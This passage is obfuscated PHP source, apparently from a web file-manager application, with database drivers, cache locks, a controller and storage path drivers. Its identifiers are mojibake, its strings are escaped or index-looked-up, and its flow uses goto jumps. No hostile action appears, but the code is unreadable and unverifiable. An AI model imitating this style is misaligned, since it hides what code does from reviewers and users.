"\123\x79\x73\x74\145\155\56\x6e\157\164\x69\143\x65\x4c\x69\x73\164"; public $field = array("\x6e\141\x6d\145", "\x63\157\156\164\x65\156\x74", "\141\x75\164\x68", "\x6d\157\x64\x65", "\x74\x69\x6d\x65", "\164\171\x70\145", "\154\x65\x76\145\x6c", "\x65\x6e\x61\x62\154\145", "\x73\x6f\162\164"); public function listData($ÕŸÑéù» = false, $‚¹“¤ç = "\163\157\x72\x74", $ˆàšë¿ë = false) { return parent::listData($ÕŸÑéù», $‚¹“¤ç, $ˆàšë¿ë); } public function add($Í¼úÑı²) { $ñ Óœ’Ê =& $_SERVER[åÄ¼Ùßš]; $ßõ…Õ = time(); if ($Í¼úÑı²[$ñ Óœ’Ê[16]] == $ñ Óœ’Ê[2507]) { $ßõ…Õ = strtotime($Í¼úÑı²[$ñ Óœ’Ê[207]]); } $Í¼úÑı²[$ñ Óœ’Ê[207]] = $ßõ…Õ; return parent::insert($Í¼úÑı²); } public function update($›èÀÖ½Á, $î´Ğùñ¡) { $šâü·˜¬ =& $_SERVER[åÄ¼Ùßš]; $×³™ß’Â = $this->listData($›èÀÖ½Á); if (!$×³™ß’Â) { return !1; } $õİäíóÑ = time(); if ($î´Ğùñ¡[$šâü·˜¬[16]] == $šâü·˜¬[2507]) { $õİäíóÑ = strtotime($î´Ğùñ¡[$šâü·˜¬[207]]); } $î´Ğùñ¡[$šâü·˜¬[207]] = $õİäíóÑ; return parent::update($›èÀÖ½Á, $î´Ğùñ¡); } public function remove($ÅÚ´È¥¢) { $ä‘œ¡¡ş = $this->listData($ÅÚ´È¥¢); if (!$ä‘œ¡¡ş || $ä‘œ¡¡ş[$_SERVER[åÄ¼Ùßš][192]]) { return !1; } return parent::remove($ÅÚ´È¥¢); } public function sort($œËæø¾, $áùëº®Ù) { return parent::update($œËæø¾, $áùëº®Ù); } public function enable($ íˆÏÉ’, $ŠØ›ÂîÈ) { return parent::update($ íˆÏÉ’, array($_SERVER[åÄ¼Ùßš][2508] => $ŠØ›ÂîÈ)); } private function initUserOption() { $Ù¼¤»ı‹ =& $_SERVER[åÄ¼Ùßš]; $this->optionType = $Ù¼¤»ı‹[2509]; $this->modelType = $Ù¼¤»ı‹[2510]; $this->field = array($Ù¼¤»ı‹[2511], $Ù¼¤»ı‹[32], $Ù¼¤»ı‹[207], $Ù¼¤»ı‹[33], $Ù¼¤»ı‹[2512], $Ù¼¤»ı‹[843], $Ù¼¤»ı‹[229]); } public function userNoticeGet($¨Øš’ã = false) { $this->initUserOption(); return parent::listData($¨Øš’ã, $_SERVER[åÄ¼Ùßš][484], !0); } public function userNoticeAdd($ôÅµá“) { $û­¡¤ÃŸ =& $_SERVER[åÄ¼Ùßš]; $this->initUserOption(); $òšŒ×š = $this->findByKey($û­¡¤ÃŸ[2511], $ôÅµá“[$û­¡¤ÃŸ[484]]); if ($òšŒ×š) { return !0; } $¼ğ¥ÖŠá = array($û­¡¤ÃŸ[2511] => $ôÅµá“[$û­¡¤ÃŸ[484]], $û­¡¤ÃŸ[32] => $ôÅµá“[$û­¡¤ÃŸ[32]], $û­¡¤ÃŸ[207] => $ôÅµá“[$û­¡¤ÃŸ[207]], $û­¡¤ÃŸ[33] => isset($ôÅµá“[$û­¡¤ÃŸ[33]]) ? $ôÅµá“[$û­¡¤ÃŸ[33]] : 1, $û­¡¤ÃŸ[2512] => isset($ôÅµá“[$û­¡¤ÃŸ[2512]]) ? $ôÅµá“[$û­¡¤ÃŸ[2512]] : 0, $û­¡¤ÃŸ[843] => 0, $û­¡¤ÃŸ[229] => 0); return parent::insert($¼ğ¥ÖŠá); } public function userNoticeEdit($¤®È…öË, $¿û¾ŞÉê) { $this->initUserOption(); return parent::update($¤®È…öË, $¿û¾ŞÉê); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\x73\x74\x65\155\137\157\160\164\151\x6f\156"; protected $jsonField = array("\155\x65\x6e\165", "\x72\x6f\x6c\145", "\162\157\x6c\145\107\162\x6f\165\x70", "\x72\145\x67\x69\163\x74", "\x65\155\x61\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($äıĞÒÙ£) { return "\123\171\163\x74\x65\155\x4f\x70\164\151\x6f\156\137{$äıĞÒÙ£}"; } protected function optionDefault($¶ë‘·ñß = '') { $Êä´¤®Ô =& $_SERVER[åÄ¼Ùßš]; if ($¶ë‘·ñß == $Êä´¤®Ô[12]) { return $GLOBALS[$Êä´¤®Ô[6]][$Êä´¤®Ô[469]]; } } } class SystemRecordModel extends ModelBaseLight { } goto A»‘ÆŠŞä; a—Á™šÁ†—: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $İÄ±³¡§ =& $_SERVER[åÄ¼Ùßš]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$İÄ±³¡§[6]] =& $config; $this->values[$İÄ±³¡§[7]] =& $in; $this->tpl = TEMPLATE . MOD . $İÄ±³¡§[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($ÆÜ—íÌ¹) { if (1 === func_num_args()) { $this->{$ÆÜ—íÌ¹} = new $ÆÜ—íÌ¹(); } else { $È›ƒ¯«Å = new ReflectionClass($ÆÜ—íÌ¹); $í»¹Ã¶ú = func_get_args(); array_shift($í»¹Ã¶ú); $this->{$ÆÜ—íÌ¹} = $È›ƒ¯«Å->newInstanceArgs($í»¹Ã¶ú); } return $this->{$ÆÜ—íÌ¹}; } public function routeBind($ğóÛ¾òÄ, $ÎÑß¥ï¼, $şÓ‘®•ø = 3) { $¾ì—Æ€Ÿ =& $_SERVER[åÄ¼Ùßš]; $ò÷ŒæËÀ = $this->in[$¾ì—Æ€Ÿ[9]]; $ğóÛ¾òÄ = str_replace($¾ì—Æ€Ÿ[10], $¾ì—Æ€Ÿ[11], trim(trim($ğóÛ¾òÄ, $¾ì—Æ€Ÿ[8]), $¾ì—Æ€Ÿ[12])); if (!$ğóÛ¾òÄ || count($ò÷ŒæËÀ) <= $şÓ‘®•ø) { return !1; } $“áå¦…î = !0; $¿æÏŒ” = explode($¾ì—Æ€Ÿ[8], $ğóÛ¾òÄ); for ($àöáÖÙş = 0; $àöáÖÙş < count($¿æÏŒ”); $àöáÖÙş++) { if ($¿æÏŒ”[$àöáÖÙş] != $ò÷ŒæËÀ[$şÓ‘®•ø + $àöáÖÙş]) { $“áå¦…î = !1; break; } } if (!$“áå¦…î) { return; } call_user_func_array(array($this, $ÎÑß¥ï¼), array()); } public function routeArgs($õ£°—åª = 3) { $ŞòÃË†ï = $this->in[$_SERVER[åÄ¼Ùßš][9]]; if (count($ŞòÃË†ï) <= $õ£°—åª) { return array(); } $›ˆÓÉÕ = array(); for ($É˜°òé— = $õ£°—åª; $É˜°òé— < count($ŞòÃË†ï); $É˜°òé— += 2) { $›ˆÓÉÕ[$ŞòÃË†ï[$É˜°òé—]] = $ŞòÃË†ï[$É˜°òé— + 1]; $this->in[$ŞòÃË†ï[$É˜°òé—]] = $ŞòÃË†ï[$É˜°òé— + 1]; } return $›ˆÓÉÕ; } protected function assign($£Å­ü¼, $‰óï‹‰) { $this->values[$£Å­ü¼] = $‰óï‹‰; } protected function display($Ô¦÷’ë) { ob_end_clean(); extract($this->values); require $this->tpl . $Ô¦÷’ë; } } class DbSqliteBase extends Db { public function __construct($›Ú“ñÒ = '') { $âŒœûÈ¼ =& $_SERVER[åÄ¼Ùßš]; if (!extension_loaded($âŒœûÈ¼[13])) { think_exception(think_lang($âŒœûÈ¼[14]) . $âŒœûÈ¼[15]); } if (!empty($›Ú“ñÒ)) { if (!isset($›Ú“ñÒ[$âŒœûÈ¼[16]])) { $›Ú“ñÒ[$âŒœûÈ¼[16]] = 438; } $this->config = $›Ú“ñÒ; if (empty($this->config[$âŒœûÈ¼[17]])) { $this->config[$âŒœûÈ¼[17]] = array(); } } } public function connect($ÕÔÇû– = '', $úñÜ‚øš = 0) { $†ùºï¸ =& $_SERVER[åÄ¼Ùßš]; if (!isset($this->linkID[$úñÜ‚øš])) { if (empty($ÕÔÇû–)) { $ÕÔÇû– = $this->config; } $ÔØ–ÛË“ = !empty($ÕÔÇû–[$†ùºï¸[17]][$†ùºï¸[18]]) ? $ÕÔÇû–[$†ùºï¸[17]][$†ùºï¸[18]] : $this->pconnect; $§ó§¡Í¬ = $ÔØ–ÛË“ ? $†ùºï¸[19] : $†ùºï¸[20]; $this->linkID[$úñÜ‚øš] = $§ó§¡Í¬($ÕÔÇû–[$†ùºï¸[21]], $ÕÔÇû–[$†ùºï¸[16]]); if (!$this->linkID[$úñÜ‚øš]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$úñÜ‚øš], 30000); if (1 != think_config($†ùºï¸[22])) { unset($this->config); } } return $this->linkID[$úñÜ‚øš]; } public function free() { $this->queryID = null; } public function query($ÛóÒ­) { $®ıè’¬… =& $_SERVER[åÄ¼Ùßš]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÛóÒ­; if ($this->queryID) { $this->free(); } think_action_status($®ıè’¬…[23], 1); think_status($®ıè’¬…[24]); $this->queryID = sqlite_query($this->_linkID, $ÛóÒ­); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $Ê³ßÖùÛ = $this->getAll(); return $Ê³ßÖùÛ; } } public function execute($´í¾ˆ£) { $Üå ©‡’ =& $_SERVER[åÄ¼Ùßš]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $´í¾ˆ£; if ($this->queryID) { $this->free(); } think_action_status($Üå ©‡’[25], 1); think_status($Üå ©‡’[24]); $Ÿ‡êğ‡¢ = sqlite_exec($this->_linkID, $´í¾ˆ£); $this->debug(); if (!1 === $Ÿ‡êğ‡¢) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[åÄ¼Ùßš][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $àÇÀ®ÔÃ = sqlite_query($this->_linkID, $_SERVER[åÄ¼Ùßš][27]); if (!$àÇÀ®ÔÃ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $¦Œ‡ÏÀì = sqlite_query($this->_linkID, $_SERVER[åÄ¼Ùßš][28]); if (!$¦Œ‡ÏÀì) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ŒˆŠŞûğ = array(); if ($this->numRows > 0) { for ($°àş¸¢ = 0; $°àş¸¢ < $this->numRows; $°àş¸¢++) { $ŒˆŠŞûğ[$°àş¸¢] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $ŒˆŠŞûğ; } public function getFields($ç½¥ÛÍµ) { $è÷­¼Î =& $_SERVER[åÄ¼Ùßš]; $™µ»ñÛê = $this->query($è÷­¼Î[29] . $ç½¥ÛÍµ . $è÷­¼Î[30]); $½Ìáéµá = array(); if ($™µ»ñÛê) { foreach ($™µ»ñÛê as $É‚œ¦¢ => $¶»¼úËŸ) { $½Ìáéµá[$¶»¼úËŸ[$è÷­¼Î[31]]] = array($è÷­¼Î[32] => $¶»¼úËŸ[$è÷­¼Î[31]], $è÷­¼Î[33] => $¶»¼úËŸ[$è÷­¼Î[34]], $è÷­¼Î[35] => (bool) ($¶»¼úËŸ[$è÷­¼Î[36]] === $è÷­¼Î[12]), $è÷­¼Î[37] => $¶»¼úËŸ[$è÷­¼Î[38]], $è÷­¼Î[39] => strtolower($¶»¼úËŸ[$è÷­¼Î[40]]) == $è÷­¼Î[41], $è÷­¼Î[42] => strtolower($¶»¼úËŸ[$è÷­¼Î[43]]) == $è÷­¼Î[44]); } } return $½Ìáéµá; } public function getTables($ôÌ…Ğ©ˆ = '') { $»Ô§Ü ¾ =& $_SERVER[åÄ¼Ùßš]; $ÜÂ¾ÉÁ = $this->query($»Ô§Ü ¾[45] . $»Ô§Ü ¾[46] . $»Ô§Ü ¾[47]); $ş¶¦¥…¸ = array(); foreach ($ÜÂ¾ÉÁ as $ŠíıŒµ => $Ø‹¨¯è“) { $ş¶¦¥…¸[$ŠíıŒµ] = current($Ø‹¨¯è“); } return $ş¶¦¥…¸; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ÈóÈ£Åô =& $_SERVER[åÄ¼Ùßš]; $ÓÎ›¦îÖ = sqlite_last_error($this->_linkID); $this->error = $ÓÎ›¦îÖ . $ÈóÈ£Åô[4] . sqlite_error_string($ÓÎ›¦îÖ); if ($ÈóÈ£Åô[12] != $this->queryStr) { $this->error .= LNG($ÈóÈ£Åô[48]) . $this->queryStr; } think_trace($this->error, $ÈóÈ£Åô[12], $ÈóÈ£Åô[49]); return $this->error; } public function escapeString($²İ‚‚‚Ä) { return sqlite_escape_string($²İ‚‚‚Ä); } public function parseLimit($º€é¥¢) { $Êöëäª— =& $_SERVER[åÄ¼Ùßš]; $Îã—†×Ï = $Êöëäª—[12]; if (!empty($º€é¥¢)) { $º€é¥¢ = explode($Êöëäª—[50], $º€é¥¢); if (count($º€é¥¢) > 1) { $Îã—†×Ï .= $Êöëäª—[51] . $º€é¥¢[1] . $Êöëäª—[52] . $º€é¥¢[0] . $Êöëäª—[53]; } else { $Îã—†×Ï .= $Êöëäª—[51] . $º€é¥¢[0] . $Êöëäª—[53]; } } return $Îã—†×Ï; } } class DbSqlite3Base extends Db { public function __construct($úÙÆ¼É½ = '') { $°å¾à˜ =& $_SERVER[åÄ¼Ùßš]; if (!class_exists($°å¾à˜[54])) { think_exception(think_lang($°å¾à˜[14]) . $°å¾à˜[55]); } if (!empty($úÙÆ¼É½)) { if (!isset($úÙÆ¼É½[$°å¾à˜[16]])) { $úÙÆ¼É½[$°å¾à˜[16]] = 438; } $this->config = $úÙÆ¼É½; if (empty($this->config[$°å¾à˜[17]])) { $this->config[$°å¾à˜[17]] = array(); } } } public function connect($ÁıÀôŞµ = '', $¤Î‚¸·Ä = 0) { $Ä¦ˆ²Æı =& $_SERVER[åÄ¼Ùßš]; if (!isset($this->linkID[$¤Î‚¸·Ä])) { if (empty($ÁıÀôŞµ)) { $ÁıÀôŞµ = $this->config; } $this->linkID[$¤Î‚¸·Ä] = new SQLite3($ÁıÀôŞµ[$Ä¦ˆ²Æı[21]]); if (!$this->linkID[$¤Î‚¸·Ä]) { think_exception($this->linkID[$¤Î‚¸·Ä]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$¤Î‚¸·Ä]->busyTimeout(30000); if (1 != think_config($Ä¦ˆ²Æı[22])) { unset($this->config); } } return $this->linkID[$¤Î‚¸·Ä]; } public function free() { $this->queryID = null; } public function query($ò÷ºÅ¶») { $ÃÉ´°¾î =& $_SERVER[åÄ¼Ùßš]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ò÷ºÅ¶»; if ($this->queryID) { $this->free(); } think_action_status($ÃÉ´°¾î[23], 1); think_status($ÃÉ´°¾î[24]); $this->queryID = $this->_linkID->query($ò÷ºÅ¶»); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $¯Ş…ÚÓİ = $this->getAll(); $this->numRows = count($¯Ş…ÚÓİ); return $¯Ş…ÚÓİ; } } public function execute($òÏ”™Ê) { $Ë æ×™á =& $_SERVER[åÄ¼Ùßš]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $òÏ”™Ê; if ($this->queryID) { $this->free(); } think_action_status($Ë æ×™á[25], 1); think_status($Ë æ×™á[24]); $¹º´º„ù = $this->_linkID->exec($òÏ”™Ê); $this->debug(); if (!1 === $¹º´º„ù) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[åÄ¼Ùßš][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $âƒÇÁçâ = $this->_linkID->query($_SERVER[åÄ¼Ùßš][27]); if (!$âƒÇÁçâ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ê×¥€˜ = $this->_linkID->query($_SERVER[åÄ¼Ùßš][28]); if (!$Ê×¥€˜) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $æ€ÊŠÙ = array(); while ($ö†êèƒ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $æ€ÊŠÙ[] = $ö†êèƒ; } $this->queryID->reset(); return $æ€ÊŠÙ; } public function getFields($¿åÊğîØ) { $¿·ºÚ¼ú =& $_SERVER[åÄ¼Ùßš]; $Ä…Õéô» = $this->query($¿·ºÚ¼ú[29] . $¿åÊğîØ . $¿·ºÚ¼ú[30]); $Â“¿ëï = array(); if ($Ä…Õéô») { foreach ($Ä…Õéô» as $–¹€ä® => $—æ€Àïû) { $Â“¿ëï[$—æ€Àïû[$¿·ºÚ¼ú[32]]] = array($¿·ºÚ¼ú[32] => $—æ€Àïû[$¿·ºÚ¼ú[32]], $¿·ºÚ¼ú[33] => $—æ€Àïû[$¿·ºÚ¼ú[33]], $¿·ºÚ¼ú[35] => (bool) ($—æ€Àïû[$¿·ºÚ¼ú[35]] === $¿·ºÚ¼ú[12]), $¿·ºÚ¼ú[37] => $—æ€Àïû[$¿·ºÚ¼ú[56]], $¿·ºÚ¼ú[39] => (bool) $—æ€Àïû[$¿·ºÚ¼ú[57]], $¿·ºÚ¼ú[42] => (bool) $—æ€Àïû[$¿·ºÚ¼ú[57]]); } } return $Â“¿ëï; } public function getTables($’Ë²«À = '') { $î—ä›¥» =& $_SERVER[åÄ¼Ùßš]; $„¡¼éš÷ = $this->query($î—ä›¥»[45] . $î—ä›¥»[46] . $î—ä›¥»[47]); $šÄ¿Óö† = array(); foreach ($„¡¼éš÷ as $áİ±ÓÎ× => $•Ú“ ¶Ö) { $šÄ¿Óö†[$áİ±ÓÎ×] = current($•Ú“ ¶Ö); } return $šÄ¿Óö†; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Äïúóİ =& $_SERVER[åÄ¼Ùßš]; $this->error = $this->_linkID->lastErrorMsg(); if ($Äïúóİ[12] != $this->queryStr) { $this->error .= LNG($Äïúóİ[48]) . $this->queryStr; } think_trace($this->error, $Äïúóİ[12], $Äïúóİ[49]); return $this->error; } public function escapeString($™‰ôèü‚) { $î¶ØÍÀ’ =& $_SERVER[åÄ¼Ùßš]; if ($this->_linkID) { return $this->_linkID->escapeString($™‰ôèü‚); } return str_ireplace($î¶ØÍÀ’[58], $î¶ØÍÀ’[59], $™‰ôèü‚); } public function parseLimit($ñàÉ¥Ğé) { $ùß¤Æ—× =& $_SERVER[åÄ¼Ùßš]; $õš¶Èâ = $ùß¤Æ—×[12]; if (!empty($ñàÉ¥Ğé)) { $ñàÉ¥Ğé = explode($ùß¤Æ—×[50], $ñàÉ¥Ğé); if (count($ñàÉ¥Ğé) > 1) { $õš¶Èâ .= $ùß¤Æ—×[51] . $ñàÉ¥Ğé[1] . $ùß¤Æ—×[52] . $ñàÉ¥Ğé[0] . $ùß¤Æ—×[53]; } else { $õš¶Èâ .= $ùß¤Æ—×[51] . $ñàÉ¥Ğé[0] . $ùß¤Æ—×[53]; } } return $õš¶Èâ; } } goto cò‘Ü”ñî; aÇãË×‡: class CacheLockMemcached { public function lock($ê´ŒŞ€, $ÓÊ“´Ô™ = 0) { $ıõœ¾ˆü = Cache::init(); $œÓı½±ø = microtime(!0) + $ÓÊ“´Ô™; while (microtime(!0) < $œÓı½±ø) { $ĞšÎÑ¿‡ = $ıõœ¾ˆü->get($ê´ŒŞ€); if (!$ĞšÎÑ¿‡ || $ĞšÎÑ¿‡ < microtime(!0)) { $Ø¤­ÚÀÉ = $ıõœ¾ˆü->handle->add($ê´ŒŞ€, $œÓı½±ø, $ÓÊ“´Ô™); if ($Ø¤­ÚÀÉ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ĞÂŒÃÊı) { return Cache::init()->get($ĞÂŒÃÊı); } public function unlock($É¿¿ĞçÔ) { return Cache::init()->remove($É¿¿ĞçÔ); } } class CacheLockDatabase { public function lock($¡ì ÷, $Ûâºëİ = 0) { $”ÎŞ³·û = Model($_SERVER[åÄ¼Ùßš][930]); $Õ”¹Ü½ = microtime(!0) + $Ûâºëİ; while (microtime(!0) < $Õ”¹Ü½) { $¡Ş™ç–Á = $”ÎŞ³·û->get($¡ì ÷); if (!$¡Ş™ç–Á || $¡Ş™ç–Á < microtime(!0)) { $Ì¦²şìÓ = $”ÎŞ³·û->set($¡ì ÷, $Õ”¹Ü½); if ($Ì¦²şìÓ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Úø¿ ÛÔ) { return Model($_SERVER[åÄ¼Ùßš][930])->get($Úø¿ ÛÔ); } public function unlock($í—€ Ïç) { Model($_SERVER[åÄ¼Ùßš][930])->remove($í—€ Ïç); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($Šæ”Ï«, $ÙáèôÖ§) { $¡Àõ©¨ =& $_SERVER[åÄ¼Ùßš]; if (!class_exists($¡Àõ©¨[973])) { show_json($¡Àõ©¨[974], !1); } $this->cacheTime = $ÙáèôÖ§; $this->handle = new Memcached(); if (is_array($Šæ”Ï«[$¡Àõ©¨[975]]) && count($Šæ”Ï«[$¡Àõ©¨[975]]) >= 1) { foreach ($Šæ”Ï«[$¡Àõ©¨[975]] as $¿œá •ß) { $÷àå£„ƒ = explode($¡Àõ©¨[4], $¿œá •ß); $this->handle->addServer($÷àå£„ƒ[0], $÷àå£„ƒ[1]); } } else { $this->handle->addServer($Šæ”Ï«[$¡Àõ©¨[209]], $Šæ”Ï«[$¡Àõ©¨[210]]); } } public function set($ÑšÆååÃ, $ê¦Üİı, $Ê–æÆ— = false) { $Ê–æÆ— = $Ê–æÆ— ? $Ê–æÆ— : $this->cacheTime; return $this->handle->set($ÑšÆååÃ, $ê¦Üİı, $Ê–æÆ—); } public function get($œß“Ù) { return $this->handle->get($œß“Ù); } public function remove($Û­ğÓ£é) { return $this->handle->delete($Û­ğÓ£é); } public function deleteAll() { return $this->handle->flush(); } } goto fÔ‘òÌÌÖÖ; b­„²ÁŞ‘: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($Ì˜—šò ) { $Ö‰»äÜ¼ =& $_SERVER[åÄ¼Ùßš]; parent::__construct($Ì˜—šò ); $±½§•¥ = isset($Ì˜—šò [$Ö‰»äÜ¼[259]]) && $Ì˜—šò [$Ö‰»äÜ¼[259]] == $Ö‰»äÜ¼[250] ? $Ö‰»äÜ¼[250] : $Ö‰»äÜ¼[316]; $this->setSignVersion($±½§•¥); } public function link($ì¾·…Ë, $“ØğˆÁ© = array()) { return parent::link($ì¾·…Ë, $“ØğˆÁ©); } public function fileOut($ä¶åÛ°ç, $‰èšÍˆ£ = false, $ãĞ¢Ê¹Û = false, $µ­ú‹‹º = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[åÄ¼Ùßš][317])) { return parent::fileOutServer($ä¶åÛ°ç, $‰èšÍˆ£, $ãĞ¢Ê¹Û, $µ­ú‹‹º); } parent::fileOut($ä¶åÛ°ç, $‰èšÍˆ£, $ãĞ¢Ê¹Û, $µ­ú‹‹º); } public function fileOutImage($¸À´¼†, $İÙ²£ÀÁ = 250) { if (strstr($this->endpoint, $_SERVER[åÄ¼Ùßš][317])) { return parent::fileOutImageServer($¸À´¼†, $İÙ²£ÀÁ); } parent::fileOutImage($¸À´¼†, $İÙ²£ÀÁ); } } define($_SERVER[åÄ¼Ùßš][318], 1); define($_SERVER[åÄ¼Ùßš][319], 2); goto a‚Ê„†Ò¢; F¯ÙšËªÌ…: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($¯òß„œ) { $this->pathParse = $¯òß„œ; $this->model = Model($_SERVER[åÄ¼Ùßš][1466]); } public function getPath($Ã©ÎœÍº) { return trim($Ã©ÎœÍº, $_SERVER[åÄ¼Ùßš][8]); } public function pathFather($½¤…Æ) { $™ğ‰±•£ = $this->parse($½¤…Æ); $™ğ‰±•£ = $this->infoSimple($½¤…Æ); return $™ğ‰±•£ ? $™ğ‰±•£[$_SERVER[åÄ¼Ùßš][193]] : !1; } public function pathThis($óªË¦Ôè) { $§·¹¾½¾ = $this->infoSimple($óªË¦Ôè); return $§·¹¾½¾ ? $§·¹¾½¾[$_SERVER[åÄ¼Ùßš][32]] : !1; } public function getPathOuter($é‚ô§Ö) { if (!$é‚ô§Ö) { return $é‚ô§Ö; } $Û…»ôÔ = $this->parse($é‚ô§Ö); return KodIO::make($Û…»ôÔ[$_SERVER[åÄ¼Ùßš][484]]); } public function copyFolderFromIO($æ ÍéŞõ, $°«ÛçÒÓ, $•ØÏöúÖ, $«Û©ÜÑÜ, $«Ú¦£·) { $¾¾£öØİ = $this->model->copyFolderFromIO($æ ÍéŞõ, $°«ÛçÒÓ, $•ØÏöúÖ, $«Û©ÜÑÜ, $«Ú¦£·); return KodIO::make($¾¾£öØİ); } public function isParentOf($…üÌÃ ù, $ú¡ÙÌœó) { return $this->model->isParentOf($…üÌÃ ù, $ú¡ÙÌœó); } public function mkfile($…Ôï‰”Ã, $Ô¬±¤õ = '', $ÔÉ¤±¦Ú = REPEAT_RENAME) { $íÓÁÙ´Ç =& $_SERVER[åÄ¼Ùßš]; $óĞÆƒÉ‰ = $this->parse($…Ôï‰”Ã); $…Ôï‰”Ã = $óĞÆƒÉ‰[$íÓÁÙ´Ç[484]]; for ($¼Ší³½ö = 0; $¼Ší³½ö < count($óĞÆƒÉ‰[$íÓÁÙ´Ç[1467]]); $¼Ší³½ö++) { $¼€Ù½¨È = $óĞÆƒÉ‰[$íÓÁÙ´Ç[1467]][$¼Ší³½ö]; if ($¼Ší³½ö == count($óĞÆƒÉ‰[$íÓÁÙ´Ç[1467]]) - 1) { $…Ôï‰”Ã = $this->model->mkfile($…Ôï‰”Ã, $¼€Ù½¨È, $Ô¬±¤õ, $ÔÉ¤±¦Ú); break; } $…Ôï‰”Ã = $this->model->mkdir($…Ôï‰”Ã, $¼€Ù½¨È, REPEAT_SKIP); } return $this->getPathOuter($…Ôï‰”Ã); } public function mkdir($Ï°ç¥§Ş, $›²æœ´µ = REPEAT_SKIP) { $İ€Š°àı =& $_SERVER[åÄ¼Ùßš]; $­áÃ¢«¼ = $this->parse($Ï°ç¥§Ş); $Ï°ç¥§Ş = $­áÃ¢«¼[$İ€Š°àı[484]]; for ($ø–¥çÆò = 0; $ø–¥çÆò < count($­áÃ¢«¼[$İ€Š°àı[1467]]); $ø–¥çÆò++) { $òàäö”Ğ = $­áÃ¢«¼[$İ€Š°àı[1467]][$ø–¥çÆò]; $Ï°ç¥§Ş = $this->model->mkdir($Ï°ç¥§Ş, $òàäö”Ğ, $›²æœ´µ); } return $this->getPathOuter($Ï°ç¥§Ş); } public function copyFile($·µ«æÅö, $º÷šÁä, $”íççå = REPEAT_REPLACE) { $á­ãŸÇ =& $_SERVER[åÄ¼Ùßš]; $ã¸ôå°È = $this->parse($º÷šÁä); $²ÀæÄ”° = $this->model->copy($·µ«æÅö, $ã¸ôå°È[$á­ãŸÇ[484]], $”íççå, $ã¸ôå°È[$á­ãŸÇ[87]]); return $²ÀæÄ”° ? $this->getPathOuter($²ÀæÄ”°) : !1; } public function moveFile($Ü¯¦ÔÌË, $çäãõ‚Ë, $„õœ¿íİ = REPEAT_REPLACE) { $›‰Òış =& $_SERVER[åÄ¼Ùßš]; $òìú¶«‡ = $this->parse($çäãõ‚Ë); $¸ÙóÆ­Ø = $this->model->move($Ü¯¦ÔÌË, $òìú¶«‡[$›‰Òış[484]], $„õœ¿íİ, $òìú¶«‡[$›‰Òış[87]]); return $¸ÙóÆ­Ø ? $this->getPathOuter($¸ÙóÆ­Ø) : !1; } public function copy($Ä—³ÆÒ…, $¬èÎ•ª, $ƒõ‹Ëä® = REPEAT_REPLACE, $ğáÁ‡ß = false) { $¿¨Ä±²Ì = $this->parse($¬èÎ•ª); $Çµ€¡Ş = $this->model->copy($Ä—³ÆÒ…, $¿¨Ä±²Ì[$_SERVER[åÄ¼Ùßš][484]], $ƒõ‹Ëä®, $ğáÁ‡ß); return $Çµ€¡Ş ? $this->getPathOuter($Çµ€¡Ş) : !1; } public function moveSameAllow() { } public function move($À¡Œç¬å, $æ²© £‡, $¨‰”œï¶ = REPEAT_REPLACE, $ü‰ş¥â½ = false) { $Á‚ñæÍˆ = $this->parse($æ²© £‡); $…²”»´‚ = $this->model->move($À¡Œç¬å, $Á‚ñæÍˆ[$_SERVER[åÄ¼Ùßš][484]], $¨‰”œï¶, $ü‰ş¥â½); return $…²”»´‚ ? $this->getPathOuter($…²”»´‚) : !1; } public function remove($Û¨¤“ø, $Ùø°Ö¹î = true) { return $this->model->remove($Û¨¤“ø, $Ùø°Ö¹î); } public function rename($Ñ€ƒĞ±ª, $©›¡µ¾›) { $ÅÓÉ‰×ñ = $this->model->rename($Ñ€ƒĞ±ª, $©›¡µ¾›); return $ÅÓÉ‰×ñ ? $this->getPathOuter($Ñ€ƒĞ±ª) : $ÅÓÉ‰×ñ; } public function size($ñ²³¬˜) { $Îµ§ü€– = $this->infoSimple($ñ²³¬˜); return $Îµ§ü€– ? $Îµ§ü€–[$_SERVER[åÄ¼Ùßš][79]] : 0; } public function 